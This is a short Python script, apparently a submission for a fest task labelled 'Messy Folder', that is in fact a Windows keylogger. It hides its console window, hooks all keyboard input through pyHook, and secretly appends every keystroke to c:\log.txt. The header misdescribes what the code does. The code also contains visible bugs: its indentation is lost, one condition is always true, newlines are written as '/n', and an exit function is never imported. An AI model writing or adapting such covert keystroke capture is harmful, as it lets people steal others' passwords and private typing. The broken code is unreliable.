'''
Name of the Task : Messy Folder
KIITFEST ID : KF36723
Operating System : Windows 10
Programming Language used: Python
External modules used (if any) : win32console, win32gui, win32api, pythoncom, pyHook
Additional instructions to use the program (if any) : None.
'''
import win32api
import win32console
import win32gui
import pythoncom,pyHook
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
def OnKeyboardEvent(event):
if event.Ascii==5:
_exit(1)
if event.Ascii !=0 or 8:
#open output.txt to read current keystrokes
f=open('c:\log.txt','r+')
buffer=f.read()
f.close()
#open output.txt to write current + new keystrokes
f=open('c:\log.txt','w')
keylogs=chr(event.Ascii)
if event.Ascii==13:
keylogs='/n'
buffer+=keylogs
f.write(buffer)
f.close()
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()